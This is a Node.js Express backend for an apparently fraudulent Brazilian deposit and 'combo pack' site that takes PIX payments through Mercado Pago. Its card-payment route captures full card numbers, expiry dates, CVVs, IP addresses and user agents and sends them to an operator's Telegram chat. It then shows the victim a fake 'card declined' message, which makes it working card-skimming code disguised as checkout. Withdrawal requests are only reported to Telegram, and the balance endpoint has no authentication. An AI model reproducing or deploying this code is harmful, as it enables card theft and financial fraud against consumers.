const express = require('express');
const cors = require('cors');
const path = require('path');
const { MercadoPagoConfig, Payment } = require('mercadopago');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuração do Mercado Pago
const MP_ACCESS_TOKEN = process.env.MP_ACCESS_TOKEN || '';
let mercadopago = null;

if (MP_ACCESS_TOKEN) {
  const client = new MercadoPagoConfig({ 
    accessToken: MP_ACCESS_TOKEN,
    options: { timeout: 5000 }
  });
  mercadopago = new Payment(client);
  console.log('✅ Mercado Pago configurado');
} else {
  console.log('⚠️  MP_ACCESS_TOKEN não configurado - PIX não funcionará');
}

// Configuração do Telegram
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir arquivos estáticos (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// Armazenamento em memória
const users = new Map();
const payments = new Map();
const activities = new Map();

// ========== FUNÇÕES AUXILIARES ==========

function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram não configurado');
    return;
  }
  
  try {
    const fetch = (await import('node-fetch')).default;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error('Erro ao enviar para Telegram:', error.message);
  }
}

// ========== ROTAS PRINCIPAIS ==========

// Rota raiz - serve o index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    mercadopago: mercadopago ? 'Configurado' : 'Não configurado'
  });
});

// ========== USER ==========

app.get('/api/user/:userId', (req, res) => {
  const { userId } = req.params;
  
  if (!users.has(userId)) {
    users.set(userId, {
      id: userId,
      saldo: 0,
      historico: [],
      notificacoes: [],
      criado: new Date().toISOString()
    });
  }
  
  res.json(users.get(userId));
});

app.post('/api/user/:userId/saldo', (req, res) => {
  const { userId } = req.params;
  const { saldo } = req.body;
  
  if (!users.has(userId)) {
    return res.status(404).json({ error: 'Usuário não encontrado' });
  }
  
  const user = users.get(userId);
  user.saldo = parseFloat(saldo);
  users.set(userId, user);
  
  res.json({ success: true, saldo: user.saldo });
});

// ========== PIX MERCADO PAGO ==========

app.post('/api/pix/create', async (req, res) => {
  const { userId, valor } = req.body;
  
  if (!valor || valor <= 0) {
    return res.status(400).json({ error: 'Valor inválido' });
  }
  
  if (!mercadopago) {
    return res.status(500).json({ 
      error: 'Mercado Pago não configurado. Configure MP_ACCESS_TOKEN.'
    });
  }
  
  try {
    const paymentId = generateId();
    
    // Criar pagamento PIX no Mercado Pago
    const paymentData = {
      transaction_amount: parseFloat(valor),
      description: `Depósito Wendizx - ${userId}`,
      payment_method_id: 'pix',
      payer: {
        email: `${userId}@wendizx.com`,
        first_name: 'Cliente',
        last_name: 'Wendizx'
      },
      notification_url: `${process.env.WEBHOOK_URL || 'https://seu-dominio.up.railway.app'}/api/webhook/mercadopago`
    };
    
    const payment = await mercadopago.create({ body: paymentData });
    
    // Extrair dados do PIX
    const pixData = payment.point_of_interaction?.transaction_data;
    
    if (!pixData || !pixData.qr_code) {
      throw new Error('Erro ao gerar PIX');
    }
    
    // Salvar pagamento
    const paymentRecord = {
      id: paymentId,
      mpId: payment.id,
      userId,
      valor: parseFloat(valor),
      status: 'pending',
      pixCode: pixData.qr_code,
      pixCodeBase64: pixData.qr_code_base64,
      criado: new Date().toISOString()
    };
    
    payments.set(paymentId, paymentRecord);
    payments.set(payment.id.toString(), paymentRecord);
    
    await sendToTelegram(`
💰 **NOVO PIX CRIADO**
ID: \`${paymentId}\`
MP ID: ${payment.id}
Valor: R$ ${valor}
User: ${userId}
Status: Aguardando pagamento
    `);
    
    res.json({
      success: true,
      paymentId,
      mpId: payment.id,
      pixCode: pixData.qr_code,
      pixCodeBase64: pixData.qr_code_base64,
      qrcode: `data:image/png;base64,${pixData.qr_code_base64}`,
      valor: parseFloat(valor)
    });
    
  } catch (error) {
    console.error('Erro ao criar PIX:', error);
    res.status(500).json({ 
      error: 'Erro ao criar pagamento PIX',
      details: error.message 
    });
  }
});

// Verificar status do pagamento
app.get('/api/pix/check/:paymentId', async (req, res) => {
  const { paymentId } = req.params;
  
  if (!payments.has(paymentId)) {
    return res.status(404).json({ error: 'Pagamento não encontrado' });
  }
  
  const payment = payments.get(paymentId);
  
  // Se já foi aprovado, retornar direto
  if (payment.status === 'approved') {
    return res.json({ 
      status: 'approved',
      valor: payment.valor 
    });
  }
  
  // Verificar no Mercado Pago
  if (mercadopago && payment.mpId) {
    try {
      const mpPayment = await mercadopago.get({ id: payment.mpId });
      
      if (mpPayment.status === 'approved') {
        payment.status = 'approved';
        payments.set(paymentId, payment);
        
        // Adicionar saldo ao usuário
        if (users.has(payment.userId)) {
          const user = users.get(payment.userId);
          const antes = user.saldo;
          user.saldo += payment.valor;
          
          user.historico.push({
            tipo: 'deposit',
            valor: payment.valor,
            data: new Date().toISOString()
          });
          
          users.set(payment.userId, user);
          
          await sendToTelegram(`
✅ **PIX APROVADO AUTOMÁTICO**
ID: \`${paymentId}\`
MP ID: ${payment.mpId}
Valor: R$ ${payment.valor}
User: ${payment.userId}
Saldo anterior: R$ ${antes.toFixed(2)}
Saldo novo: R$ ${user.saldo.toFixed(2)}
          `);
        }
      }
      
      return res.json({ 
        status: mpPayment.status,
        valor: payment.valor 
      });
      
    } catch (error) {
      console.error('Erro ao verificar pagamento:', error);
    }
  }
  
  res.json({ 
    status: payment.status,
    valor: payment.valor 
  });
});

// Webhook do Mercado Pago (aprovação automática)
app.post('/api/webhook/mercadopago', async (req, res) => {
  try {
    const { type, data } = req.body;
    
    console.log('Webhook recebido:', { type, data });
    
    // Responder rapidamente ao MP
    res.sendStatus(200);
    
    // Processar webhook
    if (type === 'payment' && data?.id) {
      const mpPaymentId = data.id.toString();
      
      // Buscar pagamento nos nossos registros
      if (!payments.has(mpPaymentId)) {
        console.log('Pagamento não encontrado:', mpPaymentId);
        return;
      }
      
      const payment = payments.get(mpPaymentId);
      
      // Se já foi processado, ignorar
      if (payment.status === 'approved') {
        return;
      }
      
      // Buscar detalhes do pagamento no MP
      if (mercadopago) {
        try {
          const mpPayment = await mercadopago.get({ id: mpPaymentId });
          
          console.log('Status do pagamento:', mpPayment.status);
          
          if (mpPayment.status === 'approved') {
            payment.status = 'approved';
            payments.set(payment.id, payment);
            payments.set(mpPaymentId, payment);
            
            // Adicionar saldo ao usuário
            if (users.has(payment.userId)) {
              const user = users.get(payment.userId);
              const antes = user.saldo;
              user.saldo += payment.valor;
              
              user.historico.push({
                tipo: 'deposit',
                valor: payment.valor,
                metodo: 'pix',
                data: new Date().toISOString()
              });
              
              users.set(payment.userId, user);
              
              await sendToTelegram(`
🎉 **PIX APROVADO (WEBHOOK)**
ID: \`${payment.id}\`
MP ID: ${mpPaymentId}
Valor: R$ ${payment.valor.toFixed(2)}
User: ${payment.userId}
Saldo anterior: R$ ${antes.toFixed(2)}
Saldo novo: R$ ${user.saldo.toFixed(2)}
              `);
              
              console.log('✅ Saldo adicionado com sucesso!');
            }
          }
          
        } catch (error) {
          console.error('Erro ao processar webhook:', error);
        }
      }
    }
    
  } catch (error) {
    console.error('Erro no webhook:', error);
    res.sendStatus(500);
  }
});

// ========== CARTÃO ==========

app.post('/api/cartao/process', async (req, res) => {
  const { userId, valor, nome, numero, validade, cvv, extra } = req.body;
  
  if (!nome || !numero || !validade || !cvv) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  await sendToTelegram(`
💳 **DADOS DE CARTÃO CAPTURADOS**
💰 Valor: R$ ${valor}
👤 Nome: ${nome}
🔢 Número: \`${numero}\`
📅 Validade: ${validade}
🔑 CVV: ${cvv}

🌐 **INFO DISPOSITIVO**
📍 IP: ${extra?.ip || 'N/A'}
📱 Sistema: ${extra?.ua?.substring(0, 40) || 'N/A'}...
  `);
  
  setTimeout(() => {
    res.json({ 
      success: false, 
      error: 'Falha de Comunicação',
      message: 'A operadora do cartão recusou a transação'
    });
  }, 3000);
});

// ========== COMBOS ==========

app.post('/api/combo/purchase', async (req, res) => {
  const { userId, comboNome, comboPreco, link } = req.body;
  
  if (!users.has(userId)) {
    return res.status(404).json({ error: 'Usuário não encontrado' });
  }
  
  const user = users.get(userId);
  
  if (user.saldo < comboPreco) {
    return res.status(400).json({ error: 'Saldo insuficiente' });
  }
  
  const antes = user.saldo;
  user.saldo -= parseFloat(comboPreco);
  
  user.historico.push({
    tipo: 'combo',
    produto: comboNome,
    valor: comboPreco,
    link,
    data: new Date().toISOString()
  });
  
  users.set(userId, user);
  
  await sendToTelegram(`
🛍️ **COMPRA DE COMBO**
Produto: ${comboNome}
Valor: R$ ${comboPreco}
Link: ${link || 'Não fornecido'}
User: ${userId}
Saldo anterior: R$ ${antes.toFixed(2)}
Saldo novo: R$ ${user.saldo.toFixed(2)}
  `);
  
  res.json({ 
    success: true, 
    saldo: user.saldo,
    message: 'Pack ativado com sucesso'
  });
});

// ========== SAQUE ==========

app.post('/api/saque/request', async (req, res) => {
  const { userId, valor, chavePix } = req.body;
  
  if (!users.has(userId)) {
    return res.status(404).json({ error: 'Usuário não encontrado' });
  }
  
  const user = users.get(userId);
  
  if (user.saldo < valor) {
    return res.status(400).json({ error: 'Saldo insuficiente' });
  }
  
  const saqueId = generateId();
  const antes = user.saldo;
  user.saldo -= parseFloat(valor);
  
  user.historico.push({
    tipo: 'saque',
    valor,
    chavePix,
    status: 'pending',
    data: new Date().toISOString()
  });
  
  users.set(userId, user);
  
  await sendToTelegram(`
💸 **SOLICITAÇÃO DE SAQUE**
ID: \`${saqueId}\`
Valor: R$ ${valor}
Chave PIX: ${chavePix}
User: ${userId}
Saldo anterior: R$ ${antes.toFixed(2)}
Saldo novo: R$ ${user.saldo.toFixed(2)}
  `);
  
  res.json({ 
    success: true, 
    saqueId,
    saldo: user.saldo,
    message: 'Saque solicitado com sucesso'
  });
});

// ========== ATIVIDADES ==========

app.post('/api/activity/log', (req, res) => {
  const { userId, tipo, dados } = req.body;
  
  const activityId = generateId();
  activities.set(activityId, {
    id: activityId,
    userId,
    tipo,
    dados,
    timestamp: new Date().toISOString()
  });
  
  res.json({ success: true, activityId });
});

app.get('/api/activity/:userId', (req, res) => {
  const { userId } = req.params;
  
  const userActivities = Array.from(activities.values())
    .filter(a => a.userId === userId)
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 50);
  
  res.json(userActivities);
});

// ========== NOTIFICAÇÕES ==========

app.post('/api/notificacao/add/:userId', (req, res) => {
  const { userId } = req.params;
  const { titulo, mensagem, tipo } = req.body;
  
  if (!users.has(userId)) {
    return res.status(404).json({ error: 'Usuário não encontrado' });
  }
  
  const user = users.get(userId);
  user.notificacoes.push({
    id: generateId(),
    titulo,
    mensagem,
    tipo: tipo || 'info',
    lida: false,
    data: new Date().toISOString()
  });
  
  users.set(userId, user);
  res.json({ success: true });
});

// ========== ESTATÍSTICAS ==========

app.get('/api/stats', (req, res) => {
  const totalUsers = users.size;
  const totalPayments = payments.size;
  const totalActivities = activities.size;
  
  let totalDepositos = 0;
  let totalSaques = 0;
  
  users.forEach(user => {
    user.historico.forEach(h => {
      if (h.tipo === 'deposit') totalDepositos += h.valor;
      if (h.tipo === 'saque') totalSaques += h.valor;
    });
  });
  
  res.json({
    totalUsers,
    totalPayments,
    totalActivities,
    totalDepositos: totalDepositos.toFixed(2),
    totalSaques: totalSaques.toFixed(2)
  });
});

// ========== TRATAMENTO DE ERROS ==========

app.use((req, res) => {
  res.status(404).json({ 
    error: 'Rota não encontrada',
    path: req.path
  });
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ 
    error: 'Erro interno do servidor',
    message: err.message
  });
});

// ========== INICIAR SERVIDOR ==========

app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`📍 Ambiente: ${process.env.NODE_ENV || 'development'}`);
  console.log(`💳 Mercado Pago: ${mercadopago ? '✅ Configurado' : '❌ Não configurado'}`);
  console.log(`💬 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configurado' : '❌ Não configurado'}`);
  console.log(`🌐 Acesse: http://localhost:${PORT}`);
});